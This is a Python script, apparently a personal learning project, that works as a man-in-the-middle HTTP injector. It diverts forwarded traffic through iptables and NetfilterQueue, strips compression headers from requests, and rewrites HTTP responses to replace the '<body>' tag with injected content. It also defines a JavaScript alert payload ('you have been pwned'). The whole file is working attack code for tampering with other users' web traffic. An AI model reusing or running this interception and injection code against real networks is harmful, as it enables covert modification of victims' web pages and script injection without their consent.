#!/usr/bin/env
import netfilterqueue
import scapy.all as scapy
import sys
import argparse
import subprocess
from scapy.layers import http
import re
import zlib
import linecache

# stolen from here: https://stackoverflow.com/questions/14519177/python-exception-handling-line-number

def PrintException():
    exc_type, exc_obj, tb = sys.exc_info()
    f = tb.tb_frame
    lineno = tb.tb_lineno
    filename = f.f_code.co_filename
    linecache.checkcache(filename)
    line = linecache.getline(filename, lineno, f.f_globals)
    print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)


def run():
	
	set_iptables()
	create_queue()
	 

def create_queue():
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(1, intercept_packets)
	try:
		queue.run()
	except KeyboardInterrupt:
		print("[+] CTRL + C detected, resetting iptables")
		reset_iptables()
		sys.exit(0)


def set_iptables():
	subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])


def reset_iptables():
	subprocess.call(["iptables", "--flush"])

def intercept_packets(packet):
	pkt = scapy.raw(packet)
	print(pkt)
	''' captures packet and processes it '''
	try:
		target_host = "tachibanalaboratories"
		alert_message = "you have been pwned"
		payload = "<body><script>alert(\'you have been pwned\');</script>"

		scapy_packet = scapy.IP(packet.get_payload())

		if (scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(http.HTTPRequest)):
		   # print(scapy_packet.show())
			if scapy_packet[scapy.TCP].dport == 80:
				#print("payload", scapy.raw(scapy_packet[scapy.IP].payload))
				new_packet = set_http_request_header(scapy_packet)
				packet_fragment_list = scapy.fragment(new_packet)
				forward_packet(packet_fragment_list, packet)
				#packet.set_payload(str(new_packet))
				
				#print("request encoding", new_packet[http.HTTPRequest].Accept_Encoding)

		elif (scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(http.HTTPResponse)):
			#print("response original length", scapy_packet[http.HTTPResponse].Content_Length)
			load = scapy_packet[scapy.Raw].load
			#print(type(scapy_packet))
			if (scapy_packet[scapy.TCP].sport == 80):
				new_packet = set_response_headers_and_load(scapy_packet, load, payload)
				packet_fragment_list = scapy.fragment(new_packet)
				forward_packet(packet_fragment_list, packet)
				#packet.set_payload(str(new_packet))
				#new_packet[scapy.IP].show()
				#print("response modified length", new_packet[http.HTTPResponse].Content_Length)
				#print("pwn")
		else:
			packet.accept()
	except:
		PrintException()
	
	#packet.accept()

def forward_packet(fragment_list, packet):
	for index, packet_fragment in enumerate(fragment_list):
		print("fragment", index, "###########################################################################################")
		packet_fragment.show()
		packet.set_payload(str(packet_fragment))
		scapy.send(packet_fragment)
	packet.drop()
		#packet.send()
'''
#### REQUIRED FOR SOME VERSIONS OF SCAPY ####
def get_raw_response_content_length(load):
	content_length_re = re.search("(?:Content-Length:\s)(\d*)", load)
	if content_length_re:
		content_length  = content_length_re(1)
		return content_length

def set_raw_response_content_length(load, payload):
	payload_length = len(payload)
	content_length = get_response_content_length(load)
	try:
		if content_length:
			new_content_length = payload_length + content_length
			load.replace(content_length, new_content_length)
			return load
	except AttributeError:
		print("something has resulted in a None type")
		print(" payload length: ", payload_length)
		print("content length: ", content_length)

#############################################
'''

## trying to figure out a way to recompress the raw layer before forwarding it on to the target but mode -1 is wrong
## need to get this working to avoid the need to fragment packets
def gzip_load(load):
	return zlib.compress(load)


def set_response_header_value_content_length(packet, payload):
	try:
		content_length =  packet[http.HTTPResponse].Content_Length
		payload_length  = len(payload)
		new_content_length = int(content_length) + payload_length
		del packet[http.HTTPResponse].Content_Length
		packet[http.HTTPResponse].Content_Length = new_content_length
		return packet
	except:
		PrintException()


def set_response_headers_and_load(packet, load, payload):
	try:
		#compressed_load = gzip_load(load)
		#load = set_response_content_length(load, payload)

		packet = set_response_header_value_content_length(packet, payload)
		#inject payload into raw layer
		#print("Initial load", load)
		#print("payload", payload)
		payload = "<body>The feeding ramp is polished to a mirror sheen. The slide's been\
reinforced. And the interlock with the frame is tightened for added precision.\
The sight system is original, too. The thumb safety is extended to make it\
easier on the finger. A long-type trigger with non-slip grooves. A ring\
hammer... The base of the trigger guard's been filed down for a higher grip.\
And not only that, nearly every part of this gun has been expertly crafted and\
customized. Where'd you get something like this?" # just a small string before I fix the issue with fragmentation
		#payload = "<body> peepee poopoopeepee poopoopeepee poopoopeepee poopoopeepee poopoopeepee poopoopeepee poopoo"
		new_load = load.replace("<body>", payload)
		#print(type(load))
		#print("Final load", new_load)
		packet[scapy.Raw].load = new_load
		#print ("Raw load", packet[scapy.Raw].load)
		del packet[scapy.IP].len
		del packet[scapy.IP].chksum
		del packet[scapy.TCP].chksum
		return packet
	except:
		#print("Payload type:", type(payload), "payload", payload)
		#print("packet type:", type(packet), "packet", packet)
		PrintException()

def set_http_request_header(packet):
	packet[http.HTTPRequest].Accept_Encoding = ""
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet
	
run()
